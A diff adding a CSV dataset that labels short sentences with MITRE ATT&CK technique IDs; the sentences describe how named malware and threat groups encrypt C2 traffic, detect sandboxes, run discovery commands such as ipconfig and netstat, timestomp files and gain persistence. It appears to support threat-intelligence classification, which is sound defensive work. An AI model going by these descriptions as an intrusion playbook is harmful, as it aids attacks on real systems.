@@ -1,0 +1,545 @@
+label_tec,sentence
+T1573,FatDuke can AES encrypt C2 communications.
+T1573,WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.
+T1573,BLINDINGCAN has encrypted its C2 traffic with RC4.
+T1573,Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.
+T1573,SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.
+T1573,BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.
+T1573,Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers.
+T1573,SodaMaster can use RC4 to encrypt C2 communications.
+T1573,RainyDay can use RC4 to encrypt C2 communications.
+T1573,Nebulae can use RC4 and XOR to encrypt C2 communications.
+T1573,Metamorfo has encrypted C2 commands with AES-256.
+T1573,BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.
+T1573,Another Lazarus Group malware sample XORs C2 traffic.
+T1573,Inception has encrypted network communications with AES.
+T1497,"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size."
+T1497,"RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment."
+T1497,OopsIE performs several anti-VM and sandbox checks on the victim's machine.
+T1497,"GravityRAT uses WMI to check the BIOS and manufacturer information for strings like ""VMWare"", ""Virtual"", and ""XEN"" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment."
+T1497,"UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine."
+T1497,"Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis."
+T1497,Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.
+T1497,"Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."
+T1497,SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.
+T1497,QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.
+T1497,NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.
+T1497,OilRig has used macros to verify if a mouse is connected to a compromised machine.
+T1542,System firmware like BIOS and EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity.
+T1082,Tools such as Systeminfo can be used to gather detailed system information.
+T1082,JPIN can obtain system information such as OS version and disk space.
+T1082,"OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks."
+T1082,Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.
+T1082,"Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system."
+T1082,"DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine."
+T1082,"FALLCHILL can collect operating system  version information, processor information, system name, and information about installed disks from the victim."
+T1082,Zebrocy also runs the systeminfo command to gather system information.
+T1082,"ChChes collects the victim hostname, window resolution, and Microsoft Windows version."
+T1082,"RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information."
+T1082,SLOWDRIFT collects and sends system information to its C2.
+T1082,POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.
+T1082,SOUNDBITE is capable of gathering system information.
+T1082,UPPERCUT has the capability to gather the system’s hostname and OS version.
+T1082,More_eggs has the capability to gather the OS version and computer name.
+T1082,"BUBBLEWRAP collects system information, including the operating system version and hostname."
+T1082,Orz can gather the victim OS version and whether it is 64 or 32 bit.
+T1082,PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.
+T1082,"MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution."
+T1082,"Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information."
+T1082,NavRAT uses systeminfo on a victim’s machine.
+T1082,TURNEDUP is capable of gathering system information.
+T1082,"HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more."
+T1082,"StoneDrill has the capability to discover the system OS, Windows version, architecture and environment."
+T1082,njRAT enumerates the victim operating system and computer name during the initial infection.
+T1082,Ixeshe collects the computer name of the victim's system during the initial infection.
+T1082,LightNeuron gathers the victim computer name using the Win32 API call GetComputerName.
+T1082,"OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion."
+T1082,PoetRAT has the ability to gather information about the compromised host.
+T1082,Rifdoor has the ability to identify the Windows version on the compromised host.
+T1082,Attor monitors the free disk space on the system.
+T1082,"Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators."
+T1082,BackConfig has the ability to gather the victim's computer name.
+T1082,"Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on."
+T1082,"FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host."
+T1082,"BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available."
+T1082,SharpStage has checked the system settings to see if Arabic is the configured language.
+T1082,MoleNet can collect information about the about the system.
+T1082,BlackMould can enumerate local drives on a compromised host.
+T1082,KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\PHYSICALDRIVE0 API.
+T1082,"Cuba can enumerate local drives, disk type, and disk free space."
+T1082,QakBot can collect system information including the OS version and domain on a compromised host.
+T1082,"APT37 collects the computer name, the BIOS model, and execution path."
+T1082,"Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory."
+T1082,APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.
+T1082,Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.
+T1082,"Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server."
+T1082,"Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine."
+T1082,"Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information."
+T1082,A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.. APT18 can collect system information from the victim’s machine.
+T1082,Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.
+T1082,"Frankenstein has enumerated hosts, looking for the system's machine name."
+T1082,Rocke has used uname -m to collect the name and information about the infected system's kernel.
+T1082,Wizard Spider has used “systeminfo” and similar commands to acquire detailed configuration information of a victim machine.
+T1082,UNC2452 used fsutil to check available free space before executing actions that might create large files on disk.
+T1082,"Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host."
+T1082,Windigo has used a script to detect which Linux distribution and version is currently installed on the system.
+T1082,APT29 used fsutil to check available free space before executing actions that might create large files on disk.
+T1614,"Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions."
+T1614,SynAck lists all the keyboard layouts installed on the victim’s system using GetKeyboardLayoutList API and checks against a hardcoded language code list.
+T1614,"If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files."
+T1614,"It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN."
+T1614,Spark has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word “Arabic” before executing.
+T1614,"Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
+T1614,"Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services."
+T1016,Several operating system administration utilities exist that can be used to gather this information.
+T1016,Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.
+T1016,POWRUNER may collect network configuration data by running ipconfig /all on a victim.
+T1016,Orz can gather victim proxy information.
+T1016,"Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print."
+T1016,Brave Prince gathers network configuration information as well as the ARP cache.
+T1016,Felismus collects the victim LAN IP address and sends it to the C2 server.
+T1016,Kazuar gathers information about network adapters.
+T1016,Unknown Logger can obtain information about the victim's IP address.
+T1016,Denis uses ipconfig to gather the IP address from the system.
+T1016,KEYMARBLE gathers the MAC address of the victim’s machine.
+T1016,More_eggs has the capability to gather the IP address from the victim's machine.
+T1016,Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.
+T1016,Octopus can collect the host IP address from the victim’s machine.
+T1016,Naid collects the domain name from a compromised host.
+T1016,Epic uses the nbtstat -n and nbtstat -s commands on the victim’s machine.
+T1016,Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol  entries.
+T1016,SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.
+T1016,down_new has the ability to identify the MAC address of a compromised host.
+T1016,OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.
+T1016,Stuxnet collects the IP address of a compromised system.
+T1016,Dtrack can collect the host's IP addresses using the ipconfig command.
+T1016,ShadowPad has collected the domain name of the victim system.
+T1016,Explosive has collected the MAC address from the victim's machine.
+T1016,EKANS can determine the domain of a compromised host.
+T1016,"QakBot can use net config workstation, arp -a, and ipconfig /all to gather network configuration information."
+T1016,xCaon has used the GetAdaptersInfo API call to get the victim's MAC address.
+T1016,BLUELIGHT can collect IP information from the victim’s machine.
+T1016,Kobalos can record the IP address of the target machine.
+T1016,APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.
+T1016,Darkhotel has collected the IP address and network adapter information from the victim’s machine.
+T1016,OilRig has run ipconfig /all on a victim.
+T1016,"Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain."
+T1016,MuddyWater has used malware to collect the victim’s IP address and domain name.
+T1016,GALLIUM used ipconfig /all to obtain information about the victim network configuration.
+T1016,"Wizard Spider has used ""ipconfig"" to identify the network configuration of a victim machine."
+T1016,Higaisa used ipconfig to gather network configuration information.
+T1016,Mustang Panda has used ipconfig and arp to determine network configuration information.
+T1049,Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.
+T1049,RATANKBA uses netstat -ano to search for specific IP address ranges.
+T1049,Sykipot may use netstat -ano to display active network connections.
+T1049,Comnie executes the netstat -ano command.
+T1049,BlackEnergy has gathered information about local network connections using netstat.
+T1049,GravityRAT uses the netstat command to find open ports on the victim’s machine.
+T1049,Trojan.Karagany can use netstat to collect a list of network connections.
+T1049,NETWIRE can capture session logon details from a compromised host.
+T1049,Conti can enumerate routine network connections from a compromised host.
+T1049,Poseidon Group obtains and saves information about victim network interfaces and addresses.
+T1049,It has also accessed network diagram files useful for understanding how a host's network was configured.
+T1049,Chimera has used netstat -ano | findstr EST to discover network connections.
+T1049,TeamTNT runs netstat -anp to search for rival malware connections.
+T1049,TeamTNT has also used libprocesshider to modify /etc/ld.so.preload.
+T1033,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system."
+T1033,"They may do this, for example, by retrieving account usernames or by using OS Credential Dumping."
+T1033,Reaver collects the victim's username.
+T1033,Backdoor.Oldrea collects the current username from the victim.
+T1033,WINERACK can gather information on the victim username.
+T1033,Agent Tesla can collect the username from the victim’s machine.
+T1033,Azorult can collect the username from the victim’s machine.
+T1033,PowerDuke has commands to get the current user's name and SID.
+T1033,Cardinal RAT can collect the username from a victim machine.
+T1033,InvisiMole lists local users and session information.
+T1033,A module in Prikormka collects information from the victim about the current user name.
+T1033,SynAck gathers user names from infected hosts.
+T1033,Zebrocy gets the username from the system.
+T1033,Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.
+T1033,FlawedAmmyy enumerates the current user during the initial infection.
+T1033,ServHelper will attempt to enumerate the username of the victim.
+T1033,Ixeshe collects the username from the victim’s machine.
+T1033,"PoetRAT sent username, computer name, and the previously generated UUID in reply to a ""who"" command from C2."
+T1033,SDBbot has the ability to identify the user on a compromised host.
+T1033,Valak can gather information regarding the user.
+T1033,Goopy has the ability to enumerate the infected system's user name.
+T1033,SLOTHFULMEDIA has collected the username from a victim machine.
+T1033,Egregor has used tools to gather information about users.
+T1033,SideTwist can collect the username on a targeted system.
+T1033,Metamorfo has collected the username from the victim's machine.
+T1033,"An APT3 downloader uses the Windows command ""cmd.exe"" /C whoami to verify that it is running with the elevated privileges of “System.” A Gamaredon Group file stealer can gather the victim's username to send to a C2 server."
+T1033,Dragonfly 2.0 used the command query user on victim hosts.
+T1033,APT39 used Remexi to collect usernames from the system.
+T1033,"Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system."
+T1033,ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.
+T1033,"APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users."
+T1007,Epic uses the tasklist /svc command to list the services on the system.
+T1007,BBSRAT can query service configuration information.
+T1007,Sykipot may use net start to display running services.
+T1007,ZLib has the ability to discover and manipulate Windows services.
+T1007,InvisiMole can obtain running services on the victim.
+T1007,Ursnif has gathered information about running services.
+T1007,HotCroissant has the ability to retrieve a list of services on the infected host.
+T1007,Caterpillar WebShell can obtain a list of the services from a system.
+T1007,Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.
+T1007,Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.
+T1569,Adversaries may abuse system services or daemons to execute commands or programs.
+T1569,Adversaries can execute malicious content by interacting with or creating services either locally or remotely.
+T1569,"Many services are set to run at boot, which can aid in achieving persistence , but adversaries can also abuse services for one-time or temporary execution."
+T1529,Operating systems may contain commands to initiate a shutdown/reboot of a machine.
+T1529,LockerGoga has been observed shutting down infected systems.
+T1529,KillDisk attempts to reboot the machine by terminating specific processes.
+T1124,"As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server."
+T1124,Agent Tesla can collect the timestamp from the victim’s machine.
+T1124,"PowerDuke has commands to get the time the machine was built, the time, and the time zone."
+T1124,HOPLIGHT has been observed collecting system time from victim machines.
+T1124,StoneDrill can obtain the current date and time of the victim machine.
+T1124,"EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox."
+T1124,GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.
+T1124,build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.
+T1124,Stuxnet collects the time and date of a system when it is infected.
+T1124,Operation Wocao has used the time command to retrieve the current time of a compromised system.
+T1124,Chimera has used time /t and net time \\ip/hostname for system time discovery.
+T1124,Sidewinder has used tools to obtain the current system time.
+T1124,ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.
+T1543,Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence.
+T1543,The systemd service manager is commonly used for managing background daemon processes  and other system resources.
+T1543,"While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence."
+T1543,Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
+T1543,TeamTNT has established persistence through the creation of a cryptocurrency mining system service.
+T1053,Timers can be set to run on a calendar event or after a time span relative to a starting point.
+T1053,"Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH."
+T1053,"Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service."
+T1080,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories."
+T1080,"Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system."
+T1080,Adversaries may use tainted shared content to move laterally.
+T1080,Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.
+T1221,Microsoft’s Office Open XML  specification defines an XML-based format for Office documents  to replace older binary formats .
+T1221,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.
+T1221,Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
+T1221,Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
+T1055,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
+T1597,Adversaries may search private data from threat intelligence vendors for information that can be used during targeting.
+T1597,Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported.
+T1497,Delays may also be based on waiting for specific victim conditions to be met  or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.
+T1497,"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function."
+T1497,Bazar can use a timer to delay execution of core functionality.
+T1497,BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.
+T1497,"ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox."
+T1497,EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.
+T1497,"SodaMaster has the ability to put itself to ""sleep"" for a specified time."
+T1497,Clop has used the sleep command to avoid sandbox detection.
+T1497,Lokibot has performed a time-based anti-debug check before downloading its third stage.
+T1497,"Using the machine's local time, XCSSET waits 43200 seconds  from the initial creation timestamp of a specific file, .report."
+T1497,"After the elapsed time, XCSSET executes additional modules."
+T1547,Time providers are implemented as dynamic-link libraries  that are registered in the subkeys of  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.
+T1547,"Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account."
+T1070,"Timestomping is a technique that modifies the timestamps of a file , often to mimic files that are in the same folder."
+T1070,InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values.
+T1070,BLINDINGCAN has modified file and directory timestamps.
+T1070,OSX_OCEANLOTUS.D can use the touch -t command to change timestamps.
+T1070,EVILNUM has changed the creation date of files.
+T1070,BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.
+T1070,Cobalt Strike will timestomp any files or payloads placed on a target machine to help them blend in.
+T1070,APT29 modified timestamps of backdoors to match legitimate Windows files.
+T1134,"For example, this may be useful for when the target user has a non-network logon session on the system."
+T1134,"Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient."
+T1588,"Commercial software may be obtained through purchase, stealing licenses , or cracking trial versions."
+T1588,"In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities ."
+T1588,Sandworm Team has acquired open-source tools for some of it's operations; for example it acquired Invoke-PSImage to establish an encrypted channel from a compromised host to Sandworm Team's C2 server as part of its preparation for the 2018 Winter Olympics attack.
+T1588,APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.
+T1588,"APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder."
+T1588,IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations.
+T1588,"DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike."
+T1588,Ke3chang has obtained and used tools such as Mimikatz.
+T1588,Thrip has obtained and used tools such as Mimikatz and PsExec.
+T1588,"Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete."
+T1588,Whitefly has obtained and used tools such as Mimikatz.
+T1588,"FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor."
+T1588,"DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec."
+T1020,Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.
+T1205,This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.
+T1205,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports  Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics."
+T1205,"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it."
+T1205,"Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control  mechanism."
+T1537,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection."
+T1565,"LightNeuron is capable of modifying email content, headers, and attachments during transit."
+T1565,"Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address."
+T1565,Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.
+T1505,"Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria."
+T1546,A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.
+T1546,Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.
+T1127,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering."
+T1199,Adversaries may breach or otherwise leverage organizations who have access to intended victims.
+T1199,Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments.
+T1111,Capturing token input  may provide temporary access  replay the one-time passcode until the next value rollover as well as possibly enabling adversaries to reliably predict future authentication values .
+T1111,It is common for one-time codes to be sent via out-of-band communications .
+T1111,"Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors."
+T1059,Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops.
+T1059,Kazuar uses /bin/bash to execute commands on the victim’s machine.
+T1059,Proton uses macOS' .command file type to script actions.
+T1059,CoinTicker executes a bash script to establish a reverse shell.
+T1059,Exaramel for Linux has a command to execute a shell command on the system.
+T1059,Skidmap has used pm.sh to download and install its main payload.
+T1059,NETWIRE has the ability to use /bin/bash and /bin/sh to execute commands.
+T1059,Penquin can execute remote commands using bash scripts.
+T1059,Doki has executed shell scripts with /bin/sh.
+T1059,Turian has the ability to use /bin/sh to execute commands.
+T1546,User Unix Shells execute several configuration scripts at different points throughout the session based on events.
+T1546,"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files."
+T1546,"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely."
+T1546,"For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+."
+T1546,"For legacy programs, macOS executes /etc/bashrc on startup."
+T1552,Adversaries may search compromised systems to find and obtain insecurely stored credentials.
+T1535,"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements."
+T1535,"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used."
+T1608,Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting.
+T1608,"By chance encounter, victims may directly download/install these backdoored files via User Execution."
+T1608,"APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting."
+T1608,"Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server."
+T1204,"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link."
+T1204,These user actions will typically be observed as follow-on behavior from forms of Phishing.
+T1204,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."
+T1564,MS Office documents with embedded VBA content store source code inside of module streams.
+T1021,Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing .
+T1021,VNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software.
+T1021,Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.
+T1021,Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.
+T1021,FIN7 has used TightVNC to control compromised hosts.
+T1078,"The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access , domain or enterprise administrator to bypass access controls set within the enterprise."
+T1078,Linux Rabbit acquires valid SSH accounts through brute force.
+T1078,Dtrack used hard-coded credentials to gain access to a network share.
+T1078,GALLIUM leveraged valid accounts to maintain access to a victim network.
+T1078,Fox Kitten has used valid credentials with various services during lateral movement.
+T1078,UNC2452 used different compromised credentials for remote access and to move laterally.
+T1218,Adversaries may abuse verclsid.exe to proxy execution of malicious code.
+T1218,Adversaries may abuse verclsid.exe to execute malicious payloads.
+T1218,"COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets  from remote servers ."
+T1125,DarkComet can access the victim’s webcam to take pictures.
+T1125,NanoCore can access the victim's webcam and capture data.
+T1125,Agent Tesla can access the victim’s webcam and record video.
+T1125,njRAT can access the victim's webcam.
+T1125,ZxShell has a command to perform video device spying.
+T1583,"Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure."
+T1584,Adversaries may compromise VPSs purchased by third-party entities.
+T1497,Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment.
+T1059,Adversaries may use VB payloads to execute malicious commands.
+T1059,NanHaiShu executes additional VBScript code on the victim's machine.
+T1059,OSX_OCEANLOTUS.D uses Word macros for execution.
+T1059,Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.
+T1059,Comnie executes VBS scripts.
+T1059,PoetRAT has used Word documents with VBScripts to execute malicious activities.
+T1059,VBShower has the ability to execute VBScript files.
+T1059,Ramsay has included embedded Visual Basic scripts in malicious documents.
+T1059,Sibot executes commands using VBScript.
+T1059,Leviathan has used VBScript.
+T1059,FIN4 has used VBA macros to display a dialog box and collect victim credentials.
+T1059,TA505 has used VBS for code execution.
+T1059,"MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros."
+T1059,"Molerats used various implants, including those built with VBScript, on target machines."
+T1059,Sharpshooter's first-stage downloader was a VBA macro.
+T1059,Higaisa has used VBScript code on the victim's machine.
+T1059,Windshift has used Visual Basic 6  payloads.
+T1059,APT38 has used VBScript to execute commands and other operational tasks.
+T1588,There is usually a delay between when a vulnerability is discovered and when it is made public.
+T1595,"Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts."
+T1596,WHOIS data is stored by regional Internet registries  responsible for allocating and assigning Internet resources such as domain names.
+T1596,Adversaries may search WHOIS data to gather actionable information.
+T1600,Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.
+T1600,"This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts."
+T1606,Adversaries may generate these cookies in order to gain access to web resources.
+T1606,"Once forged, adversaries may use these web cookies to access resources , which may bypass multi-factor and other authentication protection mechanisms."
+T1071,Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.
+T1071,BADNEWS establishes a backdoor over HTTP.
+T1071,BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.
+T1071,Psylo uses HTTPS for C2.
+T1071,GravityRAT uses HTTP for C2.
+T1071,Seasalt uses HTTP for C2 communications.
+T1071,Daserf uses HTTP for C2.
+T1071,Remsec is capable of using HTTP and HTTPS for C2.
+T1071,ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.
+T1071,The Komplex C2 channel uses HTTP POST requests.
+T1071,DarkComet can use HTTP for C2 communications.
+T1071,NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.
+T1071,LOWBALL command and control occurs via HTTPS over port 443.
+T1071,Epic uses HTTP and HTTPS for C2 communications.
+T1071,Bankshot uses HTTP for command and control communication.
+T1071,China Chopper's server component executes code sent via HTTP POST commands.
+T1071,"UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers."
+T1071,One variant of CloudDuke uses HTTP and HTTPS for C2.
+T1071,OLDBAIT can use HTTP for C2.
+T1071,Final1stspy uses HTTP for C2.
+T1071,Hi-Zor communicates with its C2 server over HTTPS.
+T1071,BUBBLEWRAP can communicate using HTTP or HTTPS.
+T1071,HyperBro has used HTTPS for C2 communications.
+T1071,Machete uses HTTP for Command & Control.
+T1071,Okrum uses HTTP for communication with its C2.
+T1071,BBK has the ability to use HTTP in communications with C2.
+T1071,BackConfig has the ability to use HTTPS for C2 communiations.
+T1071,Valak has used HTTP in communications with C2.
+T1071,Dacls can use HTTPS in C2 communications.
+T1071,Anchor has used HTTP and HTTPS in C2 communications.
+T1071,SoreFang can use HTTP in C2 communications.
+T1071,Crutch has conducted C2 communications with a Dropbox account using the HTTP API.
+T1071,Egregor has communicated with its C2 servers via HTTPS protocol.
+T1071,GuLoader can use HTTP to retrieve additional binaries.
+T1071,LookBack’s C2 proxy tool sends data to a C2 server over HTTP.
+T1071,Sibot communicated with its C2 server via HTTP GET requests.
+T1071,Ramsay has used HTTP for C2.
+T1071,ThiefQuest uploads files via unencrypted HTTP.
+T1071,AppleSeed has the ability to communicate with C2 over HTTP.
+T1071,SideTwist has used HTTP GET and POST requests over port 443 for C2.
+T1071,GrimAgent has the ability to use HTTP for C2 communications.
+T1071,QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.
+T1071,BoomBox has used HTTP POST requests for C2.
+T1071,Threat Group-3390 malware has used HTTP for C2.
+T1071,FIN4 has used HTTP POST requests to transmit data.
+T1071,"Inception has used HTTP, HTTPS, and WebDav in network communications."
+T1071,Wizard Spider has used HTTP for network communications.
+T1071,Tropic Trooper has used HTTP in communication with the C2.
+T1071,APT39 has used HTTP in communications with C2.
+T1071,Higaisa used HTTP and HTTPS to send data back to its C2 server.
